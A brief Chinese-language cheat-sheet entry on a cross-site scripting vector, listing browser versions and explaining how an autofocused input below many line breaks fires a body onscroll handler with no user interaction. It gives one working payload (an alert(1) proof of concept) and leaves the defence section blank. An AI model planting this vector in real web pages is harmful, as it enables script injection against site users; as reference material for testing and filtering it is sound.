-----

* 浏览器支持：Firefox 4.0以上、Opera 9.0以上、Safari 4.0以上、Chrome 4.0以上
* 特性：body标签新特性，通过autofocus触发<Body>的onscroll执行Javascript.
* 环境：不需要用户交互。
* 漏洞类型：XSS

-----

说明：
-----

使用autofocus移开焦点的方式来移动滚动条,这样就触发了<BODY>的onscroll事件

举例：
------

`<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>`

__说明:__ `<br>`的作用是拉长网页，使浏览器出现滚动条。

防御：
----

待定。


